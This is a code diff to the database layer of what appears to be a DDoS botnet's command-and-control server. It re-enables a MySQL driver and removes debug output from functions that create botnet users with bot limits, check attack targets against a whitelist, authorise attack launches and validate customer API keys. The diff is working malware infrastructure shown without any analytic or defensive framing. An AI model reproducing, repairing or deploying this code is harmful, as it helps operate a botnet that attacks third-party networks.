@@ -5,7 +5,7 @@ import (
     "fmt"
     "net"
     "encoding/binary"
-//    _"github.com/go-sql-driver/mysql"
+    _"github.com/go-sql-driver/mysql"
     //"time"
     //"errors"
 )
@@ -21,7 +21,7 @@ type AccountInfo struct {
 }
 
 func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
-    db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@/%s", dbUser, dbPassword, dbName))//("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
+    db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@/%s", dbUser, dbPassword, dbName))  // ("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
     fmt.Println("[database]db=",db)
     if err != nil {
         fmt.Println("[database]err",err)
@@ -62,13 +62,11 @@ func (this *Database) CreateUser(username string, password string, max_bots int,
 }
 
 func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
-    fmt.Println("[database]ContainsWhitelistedTargets_start")
     rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
     if err != nil {
         fmt.Println(err)
         return false
     }
-    fmt.Println("[database]67")
     defer rows.Close()
     for rows.Next() {
         var prefix string
@@ -85,18 +83,15 @@ func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
             binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
             iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
             if aN > netmask { // Whitelist is less specific than attack target
-                fmt.Println("[database]ContainsWhitelistedTargets_fin1")
                 if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
                     return true
                 }
             } else if aN < netmask { // Attack target is less specific than whitelist
                 if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
-                    fmt.Println("[database]ContainsWhitelistedTargets_fin2")
                     return true
                 }
             } else { // Both target and whitelist have same prefix
                 if (iWhitelistPrefix == iAttackPrefix) {
-                    fmt.Println("[database]ContainsWhitelistedTargets_fin3")
                     return true
                 }
             }
@@ -110,7 +105,6 @@ func (this *Database) CanLaunchAttack(username string, duration uint32, fullComm
 }
 
 func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
-    fmt.Println("[database]CheckApiCode")
     rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
     fmt.Println("[database]CheckApiCode rows",rows)
     if err != nil {
